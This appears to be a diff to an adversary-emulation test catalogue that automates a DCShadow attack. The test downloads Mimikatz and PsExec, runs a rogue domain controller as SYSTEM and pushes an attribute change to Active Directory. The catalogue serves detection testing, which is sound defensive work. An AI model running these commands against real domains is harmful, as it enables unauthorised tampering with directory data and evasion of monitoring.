@@ -37777,19 +37777,84 @@ defense-evasion:
     - name: DCShadow - Mimikatz
       auto_generated_guid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
       description: |
-        Utilize Mimikatz DCShadow method to simulate behavior of a Domain Controller
+        Use Mimikatz DCShadow method to simulate behavior of a Domain Controller and edit protected attribute.
 
         [DCShadow](https://www.dcshadow.com/)
         [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
+
+        It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
+        Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount
+
+        Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
+        The easiest is to run elevated and as a Domain Admin user.
       supported_platforms:
       - windows
+      input_arguments:
+        user:
+          description: Targeted user (for machine account do not forget to add final
+            '$')
+          type: string
+          default: CLIENT1$
+        mimikatz_path:
+          description: Mimikatz windows executable
+          type: path
+          default: "$env:TEMP\\mimikatz\\x64\\mimikatz.exe"
+        psexec_path:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
+
+'
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
       executor:
-        steps: |
-          1. Start Mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM.
-          2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to "push" the attributes.
-          3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480
-          4. lsadump::dcshadow /push
-        name: manual
+        name: powershell
+        elevation_required: true
+        command: |
+          # starting fake DC server, as SYSTEM (required)
+          $dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
+          Remove-Item $dc_output_file -ErrorAction Ignore
+          $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{user} /attribute:badpwdcount /value:9999`" `"exit`""
+          $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
+
+          # wait for fake DC server to be ready...
+          Start-Sleep -Seconds 5
+
+          # server ready, so trigger replication (push) and wait until it finished
+          & #{mimikatz_path} "lsadump::dcshadow /push" "exit"
+
+          Write-Host "`nWaiting for fake DC server to return"
+          Wait-Process $dc
+
+          Write-Host "`nOutput from fake DC server:"
+          Get-Content $dc_output_file
+          Remove-Item $dc_output_file -ErrorAction Ignore
+
+          Write-Host "End of DCShadow"
+        cleanup_command: Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
   T1014:
     technique:
       id: attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b
